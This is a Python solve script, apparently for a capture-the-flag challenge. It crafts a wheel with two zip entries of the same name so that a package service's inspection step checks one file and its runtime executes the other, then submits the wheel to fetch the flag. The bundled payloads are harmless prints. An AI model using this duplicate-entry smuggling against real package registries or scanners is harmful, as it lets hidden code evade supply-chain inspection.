#!/usr/bin/env python3
import base64
import hashlib
import io
import os
import re
import time
import zipfile

import requests


TARGET = os.environ.get(
    "TARGET", "https://web-cc24668d607354f2.web.h7tex.com"
).rstrip("/")
FLAG_RE = re.compile(r"H7CTF\{[^}]+\}")


def digest(data: bytes) -> str:
    return base64.urlsafe_b64encode(hashlib.sha256(data).digest()).rstrip(b"=").decode()


def make_wheel() -> tuple[str, bytes]:
    version = f"1.0.{int(time.time())}"
    stem = f"schrodinger_dup-{version}"
    module = "schrodinger_dup/__init__.py"
    metadata_name = f"{stem}.dist-info/METADATA"
    wheel_name = f"{stem}.dist-info/WHEEL"
    record_name = f"{stem}.dist-info/RECORD"
    benign = b'print("benign archive entry")\n'
    selected = b'print("selected duplicate archive entry")\n'
    metadata = (
        "Metadata-Version: 2.1\n"
        "Name: schrodinger-dup\n"
        f"Version: {version}\n"
        "Summary: duplicate member test\n"
        "License: MIT\n"
    ).encode()
    wheel = (
        b"Wheel-Version: 1.0\nGenerator: solve.py\n"
        b"Root-Is-Purelib: true\nTag: py3-none-any\n"
    )
    record = (
        f"{module},sha256={digest(selected)},{len(selected)}\n"
        f"{metadata_name},sha256={digest(metadata)},{len(metadata)}\n"
        f"{wheel_name},sha256={digest(wheel)},{len(wheel)}\n"
        f"{record_name},,\n"
    ).encode()

    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(module, benign)
        archive.writestr(metadata_name, metadata)
        archive.writestr(wheel_name, wheel)
        archive.writestr(record_name, record)
        archive.writestr(module, selected)
    return f"schrodinger_dup-{version}-py3-none-any.whl", output.getvalue()


def main() -> None:
    session = requests.Session()
    filename, wheel = make_wheel()
    response = session.post(
        f"{TARGET}/api/packages",
        files={"file": (filename, wheel, "application/octet-stream")},
        timeout=30,
    )
    response.raise_for_status()
    artifact_id = response.json()["artifact_id"]

    inspection = session.post(
        f"{TARGET}/api/packages/{artifact_id}/inspection", timeout=30
    )
    inspection.raise_for_status()
    if inspection.json().get("status") not in {"passed", "passed_with_advisories"}:
        raise RuntimeError(f"inspection rejected: {inspection.text}")

    runtime = session.post(
        f"{TARGET}/api/packages/{artifact_id}/runtime", timeout=90
    )
    runtime.raise_for_status()
    payload = runtime.json()
    flag = payload.get("flag")
    if not flag or not FLAG_RE.fullmatch(flag):
        raise RuntimeError(f"runtime completed without a valid flag: {runtime.text}")
    print(f"<FLAG>{flag}</FLAG>")


if __name__ == "__main__":
    main()
